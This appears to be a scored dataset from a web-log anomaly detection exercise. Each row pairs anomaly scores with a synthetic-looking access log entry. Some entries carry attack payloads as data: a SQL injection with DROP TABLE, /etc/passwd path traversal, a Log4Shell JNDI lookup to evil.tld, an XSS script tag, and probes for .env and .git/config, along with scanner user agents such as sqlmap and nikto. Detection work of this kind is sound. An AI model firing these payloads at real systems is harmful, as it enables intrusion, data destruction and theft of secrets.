score_content,score_session,score_fused,score_fused_norm,line
72.75675201416016,,72.75675201416016,72.75675201416016,{"remote_addr": "94.185.161.5", "time_local": "11/Jan/2025:09:01:04 -0700", "request": "OPTIONS /login HTTP/2", "status": 200, "body_bytes_sent": 4901, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
2.0616295337677,,2.0616295337677,2.0616295337677,{"remote_addr": "198.81.26.8", "time_local": "11/Jan/2025:09:01:05 -0700", "request": "GET /logout HTTP/2", "status": 204, "body_bytes_sent": 12761, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
47.417320251464844,,47.417320251464844,47.417320251464844,{"remote_addr": "15.57.88.182", "time_local": "11/Jan/2025:09:01:05 -0700", "request": "HEAD / HTTP/2", "status": 200, "body_bytes_sent": 3500, "http_referer": "https://example.com/", "http_user_agent": "nikto/2.5.0"}
104.03929901123047,,104.03929901123047,104.03929901123047,{"remote_addr": "203.31.249.190", "time_local": "11/Jan/2025:09:01:06 -0700", "request": "TRACE /about HTTP/2", "status": 200, "body_bytes_sent": 12619, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
24.403392791748047,,24.403392791748047,24.403392791748047,{"remote_addr": "52.159.160.117", "time_local": "11/Jan/2025:09:01:07 -0700", "request": "GET /api/user?id=1;DROP TABLE users HTTP/2", "status": 200, "body_bytes_sent": 11183, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
30266.0859375,,30266.0859375,30266.0859375,{"remote_addr": "128.56.52.157", "time_local": "11/Jan/2025:09:01:07 -0700", "request": "TRACE /search?q=laptop HTTP/2", "status": 404, "body_bytes_sent": 59, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
72.33248138427734,,72.33248138427734,72.33248138427734,{"remote_addr": "56.28.48.65", "time_local": "11/Jan/2025:09:01:08 -0700", "request": "HEAD /search?q=router HTTP/2", "status": 301, "body_bytes_sent": 9965, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
69.49158477783203,,69.49158477783203,69.49158477783203,{"remote_addr": "6.188.137.33", "time_local": "11/Jan/2025:09:01:09 -0700", "request": "HEAD /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 15004, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
72.79563903808594,,72.79563903808594,72.79563903808594,{"remote_addr": "152.183.13.20", "time_local": "11/Jan/2025:09:01:09 -0700", "request": "OPTIONS /admin HTTP/2", "status": 200, "body_bytes_sent": 17936, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
25.430816650390625,,25.430816650390625,25.430816650390625,{"remote_addr": "250.144.178.15", "time_local": "11/Jan/2025:09:01:10 -0700", "request": "DELETE /../../etc/passwd HTTP/2", "status": 201, "body_bytes_sent": 3566, "http_referer": "-", "http_user_agent": "dirb/2.22"}
35.61046600341797,,35.61046600341797,35.61046600341797,{"remote_addr": "73.173.67.196", "time_local": "11/Jan/2025:09:01:10 -0700", "request": "PUT /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 15235, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
3.0288796424865723,,3.0288796424865723,3.0288796424865723,{"remote_addr": "135.13.17.36", "time_local": "11/Jan/2025:09:01:11 -0700", "request": "POST /.git/config HTTP/2", "status": 200, "body_bytes_sent": 15271, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
72.7354736328125,,72.7354736328125,72.7354736328125,{"remote_addr": "121.84.226.10", "time_local": "11/Jan/2025:09:01:11 -0700", "request": "OPTIONS /logout HTTP/2", "status": 200, "body_bytes_sent": 661, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
27.312421798706055,,27.312421798706055,27.312421798706055,{"remote_addr": "77.211.124.173", "time_local": "11/Jan/2025:09:01:11 -0700", "request": "DELETE /profile HTTP/2", "status": 200, "body_bytes_sent": 12200, "http_referer": "https://www.google.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
72.76124572753906,,72.76124572753906,72.76124572753906,{"remote_addr": "90.254.161.150", "time_local": "11/Jan/2025:09:01:12 -0700", "request": "OPTIONS /login HTTP/2", "status": 200, "body_bytes_sent": 6304, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
4.73909330368042,,4.73909330368042,4.73909330368042,{"remote_addr": "156.171.91.211", "time_local": "11/Jan/2025:09:01:12 -0700", "request": "POST /contact HTTP/2", "status": 204, "body_bytes_sent": 11007, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
27.31836700439453,,27.31836700439453,27.31836700439453,{"remote_addr": "182.119.60.175", "time_local": "11/Jan/2025:09:01:13 -0700", "request": "DELETE /contact HTTP/2", "status": 200, "body_bytes_sent": 14263, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
0.24722541868686676,,0.24722541868686676,0.24722541868686676,{"remote_addr": "100.2.45.29", "time_local": "11/Jan/2025:09:01:14 -0700", "request": "GET /assets/app.js HTTP/2", "status": 200, "body_bytes_sent": 12198, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
4.7918500900268555,,4.7918500900268555,4.7918500900268555,{"remote_addr": "146.146.48.55", "time_local": "11/Jan/2025:09:01:15 -0700", "request": "POST /logout HTTP/2", "status": 200, "body_bytes_sent": 14285, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
126.2831802368164,,126.2831802368164,126.2831802368164,{"remote_addr": "31.104.197.101", "time_local": "11/Jan/2025:09:01:15 -0700", "request": "TRACE /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 7096, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
24.348888397216797,,24.348888397216797,24.348888397216797,{"remote_addr": "218.231.56.164", "time_local": "11/Jan/2025:09:01:16 -0700", "request": "GET /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 9972, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
30144.474609375,,30144.474609375,30144.474609375,{"remote_addr": "170.32.45.118", "time_local": "11/Jan/2025:09:01:16 -0700", "request": "POST /login HTTP/2", "status": 404, "body_bytes_sent": 560, "http_referer": "https://www.google.com/", "http_user_agent": "python-requests/2.31.0"}
14.611703872680664,,14.611703872680664,14.611703872680664,{"remote_addr": "159.30.7.203", "time_local": "11/Jan/2025:09:01:17 -0700", "request": "PUT /.env HTTP/2", "status": 304, "body_bytes_sent": 14551, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
5.052630424499512,,5.052630424499512,5.052630424499512,{"remote_addr": "9.28.11.10", "time_local": "11/Jan/2025:09:01:18 -0700", "request": "POST / HTTP/2", "status": 200, "body_bytes_sent": 17305, "http_referer": "https://example.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
1.964125156402588,,1.964125156402588,1.964125156402588,{"remote_addr": "180.192.241.57", "time_local": "11/Jan/2025:09:01:19 -0700", "request": "GET /api/products HTTP/2", "status": 200, "body_bytes_sent": 6120, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
103.96251678466797,,103.96251678466797,103.96251678466797,{"remote_addr": "241.168.33.46", "time_local": "11/Jan/2025:09:01:20 -0700", "request": "TRACE /contact HTTP/2", "status": 200, "body_bytes_sent": 11750, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
3.055424690246582,,3.055424690246582,3.055424690246582,{"remote_addr": "78.52.19.216", "time_local": "11/Jan/2025:09:01:20 -0700", "request": "GET /cgi-bin/test.cgi HTTP/2", "status": 302, "body_bytes_sent": 12552, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
27.046653747558594,,27.046653747558594,27.046653747558594,{"remote_addr": "76.149.44.200", "time_local": "11/Jan/2025:09:01:21 -0700", "request": "POST /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 3070, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
52.484493255615234,,52.484493255615234,52.484493255615234,{"remote_addr": "15.75.189.113", "time_local": "11/Jan/2025:09:01:22 -0700", "request": "DELETE /search?q=monitor HTTP/2", "status": 301, "body_bytes_sent": 16173, "http_referer": "https://www.google.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
126.3008041381836,,126.3008041381836,126.3008041381836,{"remote_addr": "84.218.112.159", "time_local": "11/Jan/2025:09:01:23 -0700", "request": "TRACE /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 12654, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
72.38788604736328,,72.38788604736328,72.38788604736328,{"remote_addr": "66.113.105.41", "time_local": "11/Jan/2025:09:01:24 -0700", "request": "HEAD /api/product?id=123 HTTP/2", "status": 302, "body_bytes_sent": 1198, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
11031.48046875,,11031.48046875,11031.48046875,{"remote_addr": "67.138.18.122", "time_local": "11/Jan/2025:09:01:24 -0700", "request": "GET /logout HTTP/2", "status": 500, "body_bytes_sent": 884, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
47.21806335449219,,47.21806335449219,47.21806335449219,{"remote_addr": "104.215.87.64", "time_local": "11/Jan/2025:09:01:25 -0700", "request": "HEAD /about HTTP/2", "status": 200, "body_bytes_sent": 8541, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
70.77027130126953,,70.77027130126953,70.77027130126953,{"remote_addr": "124.142.80.7", "time_local": "11/Jan/2025:09:01:25 -0700", "request": "OPTIONS /..%2f..%2fetc%2fpasswd HTTP/2", "status": 200, "body_bytes_sent": 15731, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
30.174785614013672,,30.174785614013672,30.174785614013672,{"remote_addr": "95.128.25.38", "time_local": "11/Jan/2025:09:01:26 -0700", "request": "DELETE /profile HTTP/2", "status": 302, "body_bytes_sent": 7730, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
103.89997100830078,,103.89997100830078,103.89997100830078,{"remote_addr": "174.181.221.213", "time_local": "11/Jan/2025:09:01:26 -0700", "request": "TRACE /dashboard HTTP/2", "status": 200, "body_bytes_sent": 13440, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
45.42559051513672,,45.42559051513672,45.42559051513672,{"remote_addr": "194.240.128.157", "time_local": "11/Jan/2025:09:01:27 -0700", "request": "HEAD /index.html HTTP/2", "status": 200, "body_bytes_sent": 2488, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
69.6700668334961,,69.6700668334961,69.6700668334961,{"remote_addr": "251.213.87.181", "time_local": "11/Jan/2025:09:01:28 -0700", "request": "HEAD /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2", "status": 200, "body_bytes_sent": 10172, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
25.611433029174805,,25.611433029174805,25.611433029174805,{"remote_addr": "90.17.79.171", "time_local": "11/Jan/2025:09:01:28 -0700", "request": "DELETE /index.html HTTP/2", "status": 200, "body_bytes_sent": 12045, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
2.033905506134033,,2.033905506134033,2.033905506134033,{"remote_addr": "127.220.139.40", "time_local": "11/Jan/2025:09:01:29 -0700", "request": "GET /profile HTTP/2", "status": 204, "body_bytes_sent": 15794, "http_referer": "-", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
0.2206992506980896,,0.2206992506980896,0.2206992506980896,{"remote_addr": "189.55.83.217", "time_local": "11/Jan/2025:09:01:29 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 11507, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
70.7586898803711,,70.7586898803711,70.7586898803711,{"remote_addr": "68.79.50.240", "time_local": "11/Jan/2025:09:01:30 -0700", "request": "OPTIONS /..%2f..%2fetc%2fpasswd HTTP/2", "status": 200, "body_bytes_sent": 11661, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
29.913572311401367,,29.913572311401367,29.913572311401367,{"remote_addr": "221.8.238.117", "time_local": "11/Jan/2025:09:01:31 -0700", "request": "POST /search?q=laptop HTTP/2", "status": 301, "body_bytes_sent": 6904, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
35.409114837646484,,35.409114837646484,35.409114837646484,{"remote_addr": "39.84.194.77", "time_local": "11/Jan/2025:09:01:31 -0700", "request": "PUT /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 1032, "http_referer": "https://example.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
13.247199058532715,,13.247199058532715,13.247199058532715,{"remote_addr": "19.232.133.65", "time_local": "11/Jan/2025:09:01:32 -0700", "request": "PUT /about HTTP/2", "status": 200, "body_bytes_sent": 10844, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
27.046398162841797,,27.046398162841797,27.046398162841797,{"remote_addr": "125.30.107.222", "time_local": "11/Jan/2025:09:01:32 -0700", "request": "POST /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 2853, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
126.30127716064453,,126.30127716064453,126.30127716064453,{"remote_addr": "59.150.119.171", "time_local": "11/Jan/2025:09:01:33 -0700", "request": "TRACE /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 12814, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
103.78691864013672,,103.78691864013672,103.78691864013672,{"remote_addr": "173.146.97.143", "time_local": "11/Jan/2025:09:01:33 -0700", "request": "TRACE /server-status HTTP/2", "status": 200, "body_bytes_sent": 475, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
0.18335916101932526,,0.18335916101932526,0.18335916101932526,{"remote_addr": "232.33.210.120", "time_local": "11/Jan/2025:09:01:34 -0700", "request": "GET /cgi-bin/test.cgi HTTP/2", "status": 200, "body_bytes_sent": 13717, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
3.09964919090271,,3.09964919090271,3.09964919090271,{"remote_addr": "63.178.179.223", "time_local": "11/Jan/2025:09:01:35 -0700", "request": "GET /assets/app.css HTTP/2", "status": 302, "body_bytes_sent": 12681, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
3.1025564670562744,,3.1025564670562744,3.1025564670562744,{"remote_addr": "201.139.29.171", "time_local": "11/Jan/2025:09:01:35 -0700", "request": "GET /assets/app.js HTTP/2", "status": 302, "body_bytes_sent": 5949, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
30209.07421875,,30209.07421875,30209.07421875,{"remote_addr": "168.21.76.136", "time_local": "11/Jan/2025:09:01:36 -0700", "request": "HEAD /search?q=laptop HTTP/2", "status": 403, "body_bytes_sent": 1170, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
126.23384094238281,,126.23384094238281,126.23384094238281,{"remote_addr": "164.176.105.24", "time_local": "11/Jan/2025:09:01:37 -0700", "request": "TRACE /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 15221, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
104.01651000976562,,104.01651000976562,104.01651000976562,{"remote_addr": "127.63.220.240", "time_local": "11/Jan/2025:09:01:37 -0700", "request": "TRACE /login HTTP/2", "status": 200, "body_bytes_sent": 5422, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
4.750504016876221,,4.750504016876221,4.750504016876221,{"remote_addr": "100.108.120.182", "time_local": "11/Jan/2025:09:01:39 -0700", "request": "POST /profile HTTP/2", "status": 200, "body_bytes_sent": 12504, "http_referer": "-", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
4.673830032348633,,4.673830032348633,4.673830032348633,{"remote_addr": "189.2.78.233", "time_local": "11/Jan/2025:09:01:39 -0700", "request": "POST /dashboard HTTP/2", "status": 200, "body_bytes_sent": 9498, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
98.03137969970703,,98.03137969970703,98.03137969970703,{"remote_addr": "193.161.203.214", "time_local": "11/Jan/2025:09:01:40 -0700", "request": "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 304, "body_bytes_sent": 5781, "http_referer": "-", "http_user_agent": "dirb/2.22"}
4.7211456298828125,,4.7211456298828125,4.7211456298828125,{"remote_addr": "63.99.105.40", "time_local": "11/Jan/2025:09:01:41 -0700", "request": "POST /profile HTTP/2", "status": 200, "body_bytes_sent": 2561, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "nikto/2.5.0"}
24.425823211669922,,24.425823211669922,24.425823211669922,{"remote_addr": "85.237.34.142", "time_local": "11/Jan/2025:09:01:42 -0700", "request": "GET /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 11123, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
4.691600799560547,,4.691600799560547,4.691600799560547,{"remote_addr": "138.227.41.201", "time_local": "11/Jan/2025:09:01:43 -0700", "request": "POST /api/products HTTP/2", "status": 200, "body_bytes_sent": 8677, "http_referer": "-", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
